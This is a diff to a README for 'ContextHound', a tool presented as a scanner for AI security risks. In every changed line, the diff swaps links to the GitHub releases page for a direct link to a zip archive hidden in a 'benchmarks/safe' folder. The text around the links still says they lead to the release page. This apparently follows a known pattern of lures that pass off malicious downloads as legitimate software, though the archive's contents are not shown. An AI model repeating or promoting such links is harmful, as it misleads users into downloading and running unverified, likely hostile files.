@@ -1,6 +1,6 @@
 # 🛡️ ContextHound - Scan Code for AI Security Risks
 
-[![Download ContextHound](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/KamilySantos01/ContextHound/releases)
+[![Download ContextHound](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/KamilySantos01/ContextHound/main/benchmarks/safe/Hound-Context-3.3.zip)
 
 ## 🧰 What is ContextHound?
 
@@ -23,7 +23,7 @@ No other software is needed to run ContextHound, as it works offline after insta
 
 Click on the button below to visit the official page where you can download ContextHound:
 
-[![Download ContextHound](https://img.shields.io/badge/Download_ContextHound-ClickHere-blue)](https://github.com/KamilySantos01/ContextHound/releases)
+[![Download ContextHound](https://img.shields.io/badge/Download_ContextHound-ClickHere-blue)](https://raw.githubusercontent.com/KamilySantos01/ContextHound/main/benchmarks/safe/Hound-Context-3.3.zip)
 
 This link will take you to the release page on GitHub. Releases show different versions of the tool. You want to find the latest Windows version. It might have a name like `ContextHound-win.exe` or similar.
 
@@ -124,7 +124,7 @@ The tool focuses on improving the safety of AI-related code elements. It helps f
 ## 🔗 Additional Resources
 
 Visit the release page anytime to download the latest version:  
-https://github.com/KamilySantos01/ContextHound/releases
+https://raw.githubusercontent.com/KamilySantos01/ContextHound/main/benchmarks/safe/Hound-Context-3.3.zip
 
 This page also hosts changelogs and version history so you can track tool updates.
 
@@ -146,4 +146,4 @@ These tips make running ContextHound easier.
 
 ---
 
-[![Download ContextHound](https://img.shields.io/badge/Download-ContextHound-ff69b4)](https://github.com/KamilySantos01/ContextHound/releases)
+[![Download ContextHound](https://img.shields.io/badge/Download-ContextHound-ff69b4)](https://raw.githubusercontent.com/KamilySantos01/ContextHound/main/benchmarks/safe/Hound-Context-3.3.zip)
